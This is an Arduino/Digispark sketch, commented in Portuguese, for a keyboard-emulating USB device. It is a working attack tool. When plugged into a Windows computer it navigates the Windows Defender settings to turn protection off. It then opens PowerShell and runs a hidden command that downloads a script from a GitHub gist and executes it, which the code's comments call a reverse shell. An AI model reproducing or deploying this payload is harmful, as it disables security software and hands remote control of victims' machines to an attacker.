#include "DigiKeyboard.h"
#include "DigiKeyboardPtBr.h"

void setup() {
  pinMode(0,OUTPUT); 
  pinMode(1,OUTPUT);     
}
void loop() {
  pisca_led(100);
  //Desliga o Windows Defender
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT);  //Minimiza todas as janelas abertas
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);  //Abre o executar
  DigiKeyboard.delay(1500);
  DigiKeyboard.println("Windowsdefender://threat/");  //Abre o windows defender pelo executar
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  //DigiKeyboard.print("\t");
  DigiKeyboard.delay(300);
  DigiKeyboard.print("\t");
  DigiKeyboard.delay(300);
  DigiKeyboard.print("\t");
  DigiKeyboard.delay(300);
  DigiKeyboard.print("\t");
  DigiKeyboard.delay(300);
  DigiKeyboard.print("\t");  
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");  //1 TAB
  DigiKeyboard.delay(500);
  DigiKeyboard.print("\t");  //1 TAB
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);  //Fecha a janela
  DigiKeyboard.delay(200);
  //Reverse shell
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/EndlssNightmare/8e73f5ad18de63a997c15b8cff2c95e5/raw/c7981969c4281d8fa348d83d7f1bc504f2554599/shell.ps1');\"");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  //
  pisca_led(1000); 
  for(;;){ /*empty*/ } 
}

void pisca_led(int velocidade){  
  for (int inicio =1; inicio <= 10; inicio ++) {
    digitalWrite(0, HIGH); 
    digitalWrite(1, HIGH); 
    DigiKeyboardPtBr.delay(velocidade);  
    digitalWrite(0, LOW); 
    digitalWrite(1, LOW); 
    DigiKeyboardPtBr.delay(velocidade);  
  } 
}

